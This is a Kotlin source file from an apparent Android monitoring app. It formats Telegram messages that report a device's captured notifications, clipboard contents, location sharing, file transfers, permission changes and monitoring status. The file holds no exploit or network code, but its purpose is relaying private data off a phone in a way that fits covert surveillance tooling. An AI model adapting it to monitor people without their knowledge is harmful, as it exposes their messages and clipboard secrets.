package com.xeg911.appclient.data.remote.channel.telegram.format

import com.xeg911.shared.data.model.CapturedNotification
import com.xeg911.shared.data.model.ClipboardSnapshot
import com.xeg911.shared.data.model.DeviceInfo
import com.xeg911.shared.data.model.event.DeviceEvent
import com.xeg911.shared.data.model.event.DeviceEventType
import com.xeg911.shared.data.model.notification.NotificationSourceDef
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Builds all Telegram messages.
 */
object TelegramMessageFactory {

    private const val MAX_MESSAGE_LENGTH = 4_096
    private const val MAX_CAPTION_LENGTH = 1_024

    private val LOCALE_ID = Locale.forLanguageTag("en-US")
    private val FMT_FULL = SimpleDateFormat("EEE, d MMM yyyy · HH:mm:ss", LOCALE_ID)
    private val FMT_SHORT = SimpleDateFormat("d MMM yyyy · HH:mm", LOCALE_ID)

    fun buildDeviceRegisteredMessage(
        deviceInfo: DeviceInfo,
        appControlUrl: String? = null,
    ): TelegramMessage {
        val text = buildString {
            header("📲", "NEW DEVICE")
            newline()

            appendLine(field("Name", esc(deviceInfo.deviceName)))
            appendLine(field("Brand", brandLine(deviceInfo.brand, deviceInfo.manufacturer)))
            appendLine(
                field(
                    "OS",
                    "Android ${esc(deviceInfo.androidVersion)} (API ${deviceInfo.sdkInt})"
                )
            )

            if (deviceInfo.appVersionName.isNotBlank()) {
                appendLine(field("App", "v${esc(deviceInfo.appVersionName)}"))
            }

            newline()
            append(footer(deviceInfo.deviceId, deviceInfo.lastSeen))
        }

        return TelegramMessage(
            text = TelegramHtml.truncate(text, MAX_MESSAGE_LENGTH),
            parseMode = "HTML",
            replyMarkup = appControlUrl?.let {
                TelegramKeyboard().urlButton("Open AppControl", it).build()
            },
        )
    }

    fun buildEventMessage(event: DeviceEvent): TelegramMessage {
        val (emoji, label) = when (event.type) {
            DeviceEventType.APP_OPENED -> "▶" to "APP OPENED"
            DeviceEventType.APP_CLOSED -> "⏹" to "APP CLOSED"
            DeviceEventType.MONITORING_STARTED -> "🛡" to "MONITORING STARTED"
            DeviceEventType.MONITORING_RUNNING -> "🛡" to "MONITORING RUNNING"
            DeviceEventType.MONITORING_STOPPED -> "⚠️" to "MONITORING STOPPED"
            DeviceEventType.PERMISSION_CHANGED -> "🔐" to "PERMISSION CHANGED"
            DeviceEventType.BOOT_COMPLETED -> "🔁" to "DEVICE BOOTED"
            DeviceEventType.FCM_TOKEN_REFRESHED -> "🔑" to "FCM TOKEN REFRESHED"
            DeviceEventType.DEVICE_REGISTERED -> "📲" to "DEVICE REGISTERED"
            DeviceEventType.CLIPBOARD_CAPTURED -> "📋" to "CLIPBOARD"
            DeviceEventType.NOTIFICATION_ACTION -> "⚡" to "ACTION ${esc(event.actionId)}"
            DeviceEventType.LOCATION_SHARING_STARTED -> "📍" to "LOCATION SHARING STARTED"
            DeviceEventType.LOCATION_SHARING_STOPPED -> "🛑" to "LOCATION SHARING STOPPED"
            DeviceEventType.LOCATION_REPORTED -> "📡" to "LOCATION REPORTED"
            DeviceEventType.FILE_TRANSFER -> "📁" to "FILE TRANSFER"
            DeviceEventType.RULE_TRIGGERED -> "🤖" to "RULE ${esc(event.data["ruleName"].orEmpty())}"
        }
        val text = buildString {
            header(emoji, label)
            newline()
            appendLine(field("Status", esc(event.status.name)))
            event.data.forEach { (key, value) ->
                appendLine(field(esc(key), esc(TelegramHtml.truncate(value, 200))))
            }
            newline()
            append(footer(event.deviceId, event.timestamp))
        }
        return TelegramMessage(
            text = TelegramHtml.truncate(text, MAX_MESSAGE_LENGTH),
            parseMode = "HTML",
        )
    }

    fun buildNotificationMessage(
        notification: CapturedNotification,
        sourceDef: NotificationSourceDef? = null,
    ): TelegramMessage {
        val sourceLabel = sourceDef?.label
            ?: notification.source.replaceFirstChar { it.uppercase() }

        val text = buildString {
            appendLine(TelegramHtml.bold(sourceLabel))
            newline()

            if (notification.title.isNotBlank()) {
                appendLine(field("From", esc(TelegramHtml.truncate(notification.title, 80))))
            }

            val body = notification.text.ifBlank { "(no content)" }
            appendLine(TelegramHtml.italic(TelegramHtml.truncate(body, 1_000)))

            newline()
            append(footer(notification.deviceId, notification.timestamp))
        }

        return TelegramMessage(
            text = TelegramHtml.truncate(text, MAX_MESSAGE_LENGTH),
            parseMode = "HTML",
        )
    }

    fun buildClipboardMessage(
        snapshot: ClipboardSnapshot,
        deviceId: String,
    ): TelegramMessage {
        val countTag = if (snapshot.items.size > 1) "  ·  ${snapshot.items.size} items" else ""

        val text = buildString {
            header("📋", "CLIPBOARD$countTag")
            newline()

            when {
                snapshot.isEmpty -> {
                    appendLine(TelegramHtml.italic("(clipboard empty or inaccessible)"))
                }

                snapshot.items.size == 1 -> {
                    appendLine(TelegramHtml.pre(TelegramHtml.truncate(snapshot.items[0], 800)))
                }

                else -> {
                    snapshot.items.forEachIndexed { idx, item ->
                        val cell = TelegramHtml.code(TelegramHtml.truncate(item, 300))
                        appendLine("${idx + 1}.  $cell")
                    }
                }
            }

            newline()
            append(footer(deviceId, snapshot.timestamp))
        }

        return TelegramMessage(
            text = TelegramHtml.truncate(text, MAX_MESSAGE_LENGTH),
            parseMode = "HTML",
        )
    }

    fun buildWallpaperCaption(
        deviceId: String,
        widthPx: Int,
        heightPx: Int,
        sizeBytes: Long,
        capturedAt: Long,
        deviceName: String? = null,
    ): TelegramMessage {
        val label = deviceName?.takeIf { it.isNotBlank() } ?: deviceId.take(8)

        val text = buildString {
            header("🖼", "WALLPAPER")
            newline()

            appendLine(field("Resolution", "$widthPx × $heightPx px"))
            appendLine(field("Size", "${sizeBytes / 1_024} KB"))
            appendLine(field("Captured", FMT_SHORT.format(Date(capturedAt))))

            newline()
            append(TelegramHtml.code(label))
        }

        return TelegramMessage(
            text = TelegramHtml.truncate(text.trimEnd(), MAX_CAPTION_LENGTH),
            parseMode = "HTML",
        )
    }

    fun buildGenericAlert(
        emoji: String,
        title: String,
        body: String,
        deviceId: String,
        timestamp: Long = System.currentTimeMillis(),
        keyboard: String? = null,
    ): TelegramMessage {
        val text = buildString {
            header(emoji, title)
            newline()
            appendLine(TelegramHtml.pre(body))
            newline()
            append(footer(deviceId, timestamp))
        }

        return TelegramMessage(
            text = TelegramHtml.truncate(text, MAX_MESSAGE_LENGTH),
            parseMode = "HTML",
            replyMarkup = keyboard,
        )
    }

    private fun StringBuilder.header(emoji: String, label: String) {
        appendLine("$emoji  ${TelegramHtml.bold(label)}")
    }

    private fun StringBuilder.newline() = appendLine()

    private fun field(label: String, value: String): String =
        "${TelegramHtml.bold(label)}  $value"

    private fun footer(deviceId: String, timestamp: Long): String {
        val shortId = deviceId.take(8)
        val time = FMT_FULL.format(Date(timestamp))
        return "${TelegramHtml.code(shortId)}  ·  $time"
    }

    private fun esc(text: String): String = TelegramHtml.escape(text)

    private fun brandLine(brand: String, manufacturer: String): String {
        val b = esc(brand)
        val m = esc(manufacturer)
        return if (m.isBlank() || m.equals(b, ignoreCase = true)) b else "$b · $m"
    }
}